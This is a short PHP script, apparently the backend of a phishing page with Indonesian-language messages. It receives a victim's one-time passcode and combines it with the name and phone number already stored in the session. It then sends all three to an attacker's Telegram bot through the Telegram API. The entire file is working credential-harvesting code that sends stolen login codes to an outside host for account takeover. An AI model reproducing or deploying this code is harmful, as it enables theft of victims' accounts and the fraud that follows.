<?php
session_start();
include 'telegram.php';
header("Content-Type: application/json");

$input = json_decode(file_get_contents("php://input"), true);
if (empty($input['otp'])) {
    echo json_encode(["status" => "error", "message" => "OTP wajib diisi."]);
    exit;
}

$_SESSION['otp'] = htmlspecialchars($input['otp']);
$name = $_SESSION['name'] ?? '-';
$phone = $_SESSION['phone'] ?? '-';
$otp = $_SESSION['otp'] ?? '-';

$message = "*Data Telegram*\nNama : $name\nNomor : $phone\nOTP : $otp";
$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
@file_get_contents($url);

echo json_encode(["status" => "success"]);